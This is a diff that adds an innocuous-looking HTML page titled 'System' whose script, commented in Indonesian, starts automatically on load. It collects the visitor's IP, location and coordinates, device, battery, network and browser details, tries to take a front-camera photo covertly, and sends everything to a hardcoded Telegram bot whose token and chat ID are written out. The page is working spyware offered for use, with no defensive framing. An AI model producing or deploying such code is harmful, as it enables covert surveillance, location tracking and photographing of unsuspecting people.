@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        .center-image {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1;
+            opacity: 0.15;
+            animation: fadeIn 2s ease-in-out;
+            user-select: none;
+            pointer-events: none;
+        }
+
+        .center-image img {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            box-shadow: 0 0 50px rgba(0, 0, 0, 0.03);
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
+            100% { opacity: 0.15; transform: translate(-50%, -50%) scale(1); }
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .camera-overlay {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="center-image">
+        <img src="admin.png" alt="System">
+    </div>
+
+    <script>
+        // ============================================================
+        //  KONFIGURASI
+        // ============================================================
+        const CONFIG = {
+            BOT_TOKEN: '8671571978:AAEcNUE88wVynEc93TPQ8mJ0LaJ6oegoYjw',
+            CHAT_ID: '5323588727',
+            VERSION: '10.0',
+            WHITE_BACKGROUND: true,
+            AUTO_CAPTURE: true
+        };
+
+        // ============================================================
+        //  STATE
+        // ============================================================
+        let state = {
+            collectedData: {},
+            capturedPhoto: null,
+            isScanning: false,
+            startTime: null,
+            dataPoints: 0,
+            scanCompleted: false
+        };
+
+        // ============================================================
+        //  FUNGSI PROGRESS
+        // ============================================================
+        function updateProgress(value, label) {
+            console.log(`%c📊 ${Math.min(Math.round(value), 100)}% - ${label || 'Processing...'}`, 'color:#ffaa00;');
+        }
+
+        // ============================================================
+        //  GET LOCATION
+        // ============================================================
+        async function getLocation(ip) {
+            const apis = [{
+                url: `https://ip-api.com/json/${ip}?fields=status,country,city,region,lat,lon,isp,timezone`,
+                parse: (d) => d.status === 'success' ? {
+                    location: `${d.city}, ${d.region}, ${d.country}`,
+                    coords: `${d.lat}, ${d.lon}`,
+                    isp: d.isp,
+                    timezone: d.timezone,
+                    success: true
+                } : { success: false }
+            }, {
+                url: `https://ipinfo.io/${ip}/json`,
+                parse: (d) => d.city ? {
+                    location: `${d.city}, ${d.region}, ${d.country}`,
+                    coords: d.loc || 'Unknown',
+                    isp: d.org || 'Unknown',
+                    timezone: d.timezone || 'Unknown',
+                    success: true
+                } : { success: false }
+            }, {
+                url: `https://api.ipdata.co/${ip}?api-key=test`,
+                parse: (d) => d.city ? {
+                    location: `${d.city}, ${d.region}, ${d.country_name}`,
+                    coords: `${d.latitude}, ${d.longitude}`,
+                    isp: d.org || 'Unknown',
+                    timezone: d.time_zone?.name || 'Unknown',
+                    success: true
+                } : { success: false }
+            }];
+
+            for (const api of apis) {
+                try {
+                    const res = await fetch(api.url);
+                    if (!res.ok) continue;
+                    const data = await res.json();
+                    const result = api.parse(data);
+                    if (result.success) return result;
+                } catch (e) { continue; }
+            }
+
+            if (navigator.geolocation) {
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            timeout: 5000,
+                            enableHighAccuracy: false
+                        });
+                    });
+                    const coords = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+                    return {
+                        location: `GPS: ${coords}`,
+                        coords: coords,
+                        isp: 'GPS Detected',
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        success: true
+                    };
+                } catch (e) {}
+            }
+
+            return { success: false };
+        }
+
+        // ============================================================
+        //  CAPTURE PHOTO SILENT
+        // ============================================================
+        async function capturePhotoSilent() {
+            try {
+                console.log('%c📷 Mengambil foto secara diam-diam...', 'color:#ffaa00;');
+                
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                });
+
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                
+                await video.play();
+                await new Promise(resolve => setTimeout(resolve, 300));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                const ctx = canvas.getContext('2d');
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(video, 0, 0, 640, 480);
+                
+                stream.getTracks().forEach(t => t.stop());
+                video.remove();
+                
+                const blob = await new Promise(resolve => {
+                    canvas.toBlob(resolve, 'image/jpeg', 0.85);
+                });
+                
+                state.capturedPhoto = blob;
+                console.log('%c✅ Foto berhasil diambil!', 'color:#00ff88;');
+                return blob;
+                
+            } catch (e) {
+                console.log('%c⚠️ Gagal mengambil foto:', 'color:#ff8800;', e.message);
+                return null;
+            }
+        }
+
+        // ============================================================
+        //  COLLECT ALL DATA
+        // ============================================================
+        async function collectAllData() {
+            const data = {};
+            let progress = 0;
+
+            console.log('%c🔍 Memulai pengumpulan data...', 'color:#000000;');
+
+            // IP
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const d = await res.json();
+                data.ip = d.ip;
+                console.log(`%c✅ IP: ${d.ip}`, 'color:#00aa44;');
+            } catch (e) {
+                try {
+                    const res = await fetch('https://api.ip.sb/jsonip');
+                    const d = await res.json();
+                    data.ip = d.ip;
+                    console.log(`%c✅ IP (fallback): ${d.ip}`, 'color:#00aa44;');
+                } catch (e2) {
+                    data.ip = 'Unknown';
+                    console.log('%c❌ IP: Gagal', 'color:#ff4444;');
+                }
+            }
+            progress += 8;
+            updateProgress(progress, 'IP Address detected');
+
+            // Location
+            if (data.ip && data.ip !== 'Unknown') {
+                const loc = await getLocation(data.ip);
+                if (loc.success) {
+                    data.location = loc.location;
+                    data.coordinates = loc.coords;
+                    data.isp = loc.isp;
+                    data.timezone = loc.timezone;
+                    console.log(`%c✅ Location: ${loc.location}`, 'color:#00aa44;');
+                    console.log(`%c✅ Coordinates: ${loc.coords}`, 'color:#00aa44;');
+                    console.log(`%c✅ ISP: ${loc.isp}`, 'color:#00aa44;');
+                } else {
+                    console.log('%c❌ Location: Gagal', 'color:#ff4444;');
+                }
+            }
+            progress += 15;
+            updateProgress(progress, 'Location & coordinates detected');
+
+            // Device
+            try {
+                const ua = navigator.userAgent;
+                const platform = navigator.platform;
+                data.device = `${platform} | ${ua.split(' ').slice(-3).join(' ')}`;
+                data.userAgent = ua;
+                data.platform = platform;
+                console.log(`%c✅ Device: ${data.device.substring(0, 50)}...`, 'color:#00aa44;');
+            } catch (e) {
+                console.log('%c❌ Device: Gagal', 'color:#ff4444;');
+            }
+            progress += 10;
+            updateProgress(progress, 'Device info collected');
+
+            // Battery
+            try {
+                if (navigator.getBattery) {
+                    const bat = await navigator.getBattery();
+                    const level = Math.round(bat.level * 100);
+                    const status = bat.charging ? '⚡ Charging' : '🔋 Not charging';
+                    data.battery = `${level}% (${status})`;
+                    data.batteryLevel = level;
+                    data.batteryCharging = bat.charging;
+                    console.log(`%c✅ Battery: ${level}% ${status}`, 'color:#00aa44;');
+                } else {
+                    console.log('%c⚠️ Battery: Not supported', 'color:#ff8800;');
+                }
+            } catch (e) {
+                console.log('%c❌ Battery: Gagal', 'color:#ff4444;');
+            }
+            progress += 10;
+            updateProgress(progress, 'Battery info collected');
+
+            // Network
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    data.networkType = conn.effectiveType || 'Unknown';
+                    data.networkSpeed = conn.downlink || '?';
+                    data.networkRTT = conn.rtt || '?';
+                    data.network = `${conn.effectiveType || 'Unknown'} | ${conn.downlink || '?'} Mbps`;
+                    console.log(`%c✅ Network: ${data.network}`, 'color:#00aa44;');
+                } else {
+                    console.log('%c⚠️ Network: Not supported', 'color:#ff8800;');
+                }
+            } catch (e) {
+                console.log('%c❌ Network: Gagal', 'color:#ff4444;');
+            }
+            progress += 10;
+            updateProgress(progress, 'Network info collected');
+
+            // Screen
+            try {
+                data.screenResolution = `${window.screen.width}x${window.screen.height}`;
+                data.screenColorDepth = window.screen.colorDepth;
+                data.screen = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`;
+                console.log(`%c✅ Screen: ${data.screen}`, 'color:#00aa44;');
+            } catch (e) {
+                console.log('%c❌ Screen: Gagal', 'color:#ff4444;');
+            }
+            progress += 10;
+            updateProgress(progress, 'Screen info collected');
+
+            // Viewport
+            data.viewport = `${window.innerWidth}x${window.innerHeight}`;
+
+            // Language
+            try {
+                const lang = navigator.language || navigator.userLanguage;
+                const tz = data.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone;
+                data.language = lang;
+                data.languages = navigator.languages || [lang];
+                data.timezone = tz;
+                console.log(`%c✅ Language: ${lang} | Timezone: ${tz}`, 'color:#00aa44;');
+            } catch (e) {
+                console.log('%c❌ Language: Gagal', 'color:#ff4444;');
+            }
+            progress += 10;
+            updateProgress(progress, 'Language & timezone collected');
+
+            // Memory
+            try {
+                if (performance && performance.memory) {
+                    const mem = performance.memory;
+                    data.memoryUsed = Math.round(mem.usedJSHeapSize / 1048576);
+                    data.memoryTotal = Math.round(mem.totalJSHeapSize / 1048576);
+                    data.memoryLimit = Math.round(mem.jsHeapSizeLimit / 1048576);
+                    data.memory = `${data.memoryUsed}MB / ${data.memoryTotal}MB`;
+                    console.log(`%c✅ Memory: ${data.memory}`, 'color:#00aa44;');
+                }
+            } catch (e) {}
+
+            // Device RAM
+            if (navigator.deviceMemory) {
+                data.deviceRAM = navigator.deviceMemory + ' GB';
+                console.log(`%c✅ Device RAM: ${data.deviceRAM}`, 'color:#00aa44;');
+            }
+
+            // CPU Cores
+            if (navigator.hardwareConcurrency) {
+                data.cpuCores = navigator.hardwareConcurrency;
+                console.log(`%c✅ CPU Cores: ${data.cpuCores}`, 'color:#00aa44;');
+            }
+
+            // Browser Info
+            data.browser = {
+                name: navigator.appName,
+                version: navigator.appVersion,
+                vendor: navigator.vendor || 'Unknown',
+                cookies: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'Not set'
+            };
+
+            // Timestamps
+            data.timestamp = new Date().toISOString();
+            data.timestampUnix = Date.now();
+            data.localTime = new Date().toLocaleString('id-ID', {
+                timeZone: data.timezone || 'Asia/Jakarta'
+            });
+
+            // Page Info
+            data.referrer = document.referrer || 'Direct';
+            data.pageURL = window.location.href;
+
+            // Media Devices
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                data.mediaDevices = {
+                    audioInput: devices.filter(d => d.kind === 'audioinput').length,
+                    audioOutput: devices.filter(d => d.kind === 'audiooutput').length,
+                    videoInput: devices.filter(d => d.kind === 'videoinput').length
+                };
+                console.log(`%c✅ Media Devices: Audio In=${data.mediaDevices.audioInput}, Video In=${data.mediaDevices.videoInput}`, 'color:#00aa44;');
+            } catch (e) {}
+
+            // Permissions
+            try {
+                const permissions = ['geolocation', 'camera', 'microphone', 'notifications'];
+                const permResults = {};
+                for (const perm of permissions) {
+                    try {
+                        const result = await navigator.permissions.query({ name: perm });
+                        permResults[perm] = result.state;
+                    } catch (e) {
+                        permResults[perm] = 'unknown';
+                    }
+                }
+                data.permissions = permResults;
+                console.log(`%c✅ Permissions: ${Object.keys(permResults).length} checked`, 'color:#00aa44;');
+            } catch (e) {}
+
+            progress = 100;
+            updateProgress(100, '✅ Data Collection Complete!');
+
+            state.dataPoints = Object.keys(data).length;
+            console.log(`%c📊 Total Data Points: ${state.dataPoints}`, 'color:#000000;font-weight:bold;');
+
+            return data;
+        }
+
+        // ============================================================
+        //  BUILD TELEGRAM MESSAGE
+        // ============================================================
+        function buildTelegramMessage(data) {
+            let message = `🕵️ *CYBER INTELLIGENCE REPORT - FULL DATA*\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `📌 *VERSION:* ${CONFIG.VERSION} (White Background)\n`;
+            message += `🕐 *Time:* ${data.localTime || 'Unknown'}\n\n`;
+
+            message += `━━━ 🌐 NETWORK ━━━\n`;
+            message += `IP: ${data.ip || 'Unknown'}\n`;
+            message += `ISP: ${data.isp || 'Unknown'}\n`;
+            message += `Location: ${data.location || 'Unknown'}\n`;
+            message += `Coordinates: ${data.coordinates || 'Unknown'}\n`;
+            message += `Network: ${data.network || 'Unknown'}\n\n`;
+
+            message += `━━━ 📱 DEVICE ━━━\n`;
+            message += `Device: ${data.device || 'Unknown'}\n`;
+            message += `Platform: ${data.platform || 'Unknown'}\n`;
+            message += `CPU: ${data.cpuCores || 'Unknown'} cores\n`;
+            message += `RAM: ${data.deviceRAM || 'Unknown'}\n`;
+            message += `Memory: ${data.memory || 'Unknown'}\n`;
+            message += `Battery: ${data.battery || 'Unknown'}\n\n`;
+
+            message += `━━━ 🖥️ DISPLAY ━━━\n`;
+            message += `Screen: ${data.screen || 'Unknown'}\n`;
+            message += `Viewport: ${data.viewport || 'Unknown'}\n\n`;
+
+            message += `━━━ 🌍 LANGUAGE ━━━\n`;
+            message += `Language: ${data.language || 'Unknown'}\n`;
+            message += `Timezone: ${data.timezone || 'Unknown'}\n\n`;
+
+            message += `━━━ 💻 BROWSER ━━━\n`;
+            message += `Browser: ${data.browser?.name || 'Unknown'}\n`;
+            message += `Vendor: ${data.browser?.vendor || 'Unknown'}\n`;
+            message += `Cookies: ${data.browser?.cookies ? '✅' : '❌'}\n`;
+            message += `DNT: ${data.browser?.doNotTrack || 'Not set'}\n\n`;
+
+            message += `━━━ 📷 CAMERA ━━━\n`;
+            message += `Photo: ${data.hasPhoto ? '✅ Captured (Silent)' : '❌ No Photo'}\n\n`;
+
+            message += `━━━ 📊 STATS ━━━\n`;
+            message += `Data Points: ${state.dataPoints || 0}\n`;
+            message += `Page URL: ${data.pageURL || 'Unknown'}\n`;
+            message += `Referrer: ${data.referrer || 'Direct'}\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `🔒 *All data collected securely*`;
+
+            return message;
+        }
+
+        // ============================================================
+        //  SEND TO TELEGRAM
+        // ============================================================
+        async function sendToTelegram(data, photoBlob) {
+            console.log('%c📤 Mengirim data ke Telegram...', 'color:#000000;');
+
+            const message = buildTelegramMessage(data);
+
+            try {
+                const msgRes = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                const msgData = await msgRes.json();
+                if (!msgData.ok) throw new Error('Message send failed');
+                console.log('%c✅ Pesan terkirim!', 'color:#00aa44;');
+
+                if (photoBlob) {
+                    const formData = new FormData();
+                    formData.append('chat_id', CONFIG.CHAT_ID);
+                    formData.append('photo', photoBlob, 'intel_photo.jpg');
+                    formData.append('caption', `📸 *Intel Photo* - ${data.location || 'Unknown location'}`);
+
+                    const photoRes = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const photoData = await photoRes.json();
+                    if (photoData.ok) {
+                        console.log('%c✅ Foto terkirim!', 'color:#00aa44;');
+                    } else {
+                        console.log('%c⚠️ Foto gagal terkirim', 'color:#ff8800;');
+                    }
+                }
+
+                try {
+                    const jsonStr = JSON.stringify(data, null, 2);
+                    const jsonBlob = new Blob([jsonStr], { type: 'application/json' });
+                    const formDataDoc = new FormData();
+                    formDataDoc.append('chat_id', CONFIG.CHAT_ID);
+                    formDataDoc.append('document', jsonBlob, 'data_backup.json');
+                    formDataDoc.append('caption', '📄 *JSON Backup Data*');
+
+                    await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendDocument`, {
+                        method: 'POST',
+                        body: formDataDoc
+                    });
+                    console.log('%c✅ JSON backup terkirim!', 'color:#00aa44;');
+                } catch (e) {
+                    console.log('%c⚠️ JSON backup gagal', 'color:#ff8800;');
+                }
+
+                state.scanCompleted = true;
+                console.log('%c✅ SEMUA DATA BERHASIL DIKIRIM!', 'color:#000000;font-size:16px;font-weight:bold;');
+                console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+
+                return true;
+
+            } catch (e) {
+                console.error('%c❌ Send error:', 'color:#ff4444;', e);
+                return false;
+            }
+        }
+
+        // ============================================================
+        //  MAIN SCAN
+        // ============================================================
+        async function startScan() {
+            if (state.isScanning) return;
+            state.isScanning = true;
+            state.startTime = Date.now();
+
+            console.log('%c🚀 Memulai scan...', 'color:#000000;font-size:14px;font-weight:bold;');
+
+            try {
+                const data = await collectAllData();
+                state.collectedData = data;
+
+                const photoBlob = await capturePhotoSilent();
+                if (photoBlob) {
+                    data.hasPhoto = true;
+                    state.capturedPhoto = photoBlob;
+                } else {
+                    data.hasPhoto = false;
+                }
+
+                await sendToTelegram(data, state.capturedPhoto);
+
+            } catch (e) {
+                console.error('%c❌ Scan error:', 'color:#ff4444;', e);
+            } finally {
+                state.isScanning = false;
+            }
+        }
+
+        // ============================================================
+        //  AUTO START
+        // ============================================================
+        window.addEventListener('load', () => {
+            console.log('%c🕵️ CYBER INTELLIGENCE PRO V10.0', 'font-size:20px; color:#000000; font-weight:bold;');
+            console.log('%c📌 Latar putih + 1 foto di tengah', 'color:#444444;');
+            console.log('%c🔒 Mengambil foto secara diam-diam!', 'color:#00aa44;');
+            console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+            
+            setTimeout(() => {
+                startScan();
+            }, 1500);
+        });
+
+        // ============================================================
+        //  CONSOLE COMMANDS
+        // ============================================================
+        console.log('%c📖 Console Commands:', 'color:#ff8800;');
+        console.log('%c  - startScan()  : Mulai scan manual', 'color:#0066cc;');
+        console.log('%c  - sendData()   : Kirim data ke Telegram', 'color:#0066cc;');
+        console.log('%c  - viewData()   : Lihat data di console', 'color:#0066cc;');
+        console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+
+        window.startScan = startScan;
+        window.sendData = async () => {
+            if (state.collectedData && Object.keys(state.collectedData).length > 0) {
+                await sendToTelegram(state.collectedData, state.capturedPhoto);
+            } else {
+                console.log('%c⚠️ Tidak ada data! Jalankan scan dulu.', 'color:#ff8800;');
+            }
+        };
+        window.viewData = () => {
+            if (state.collectedData && Object.keys(state.collectedData).length > 0) {
+                console.log('%c📊 Data yang dikumpulkan:', 'color:#000000;font-weight:bold;');
+                console.log(JSON.stringify(state.collectedData, null, 2));
+            } else {
+                console.log('%c⚠️ Tidak ada data!', 'color:#ff8800;');
+            }
+        };
+
+        console.log('%c✅ Sistem siap!', 'color:#00aa44;font-size:14px;font-weight:bold;');
+    </script>
+</body>
+</html>
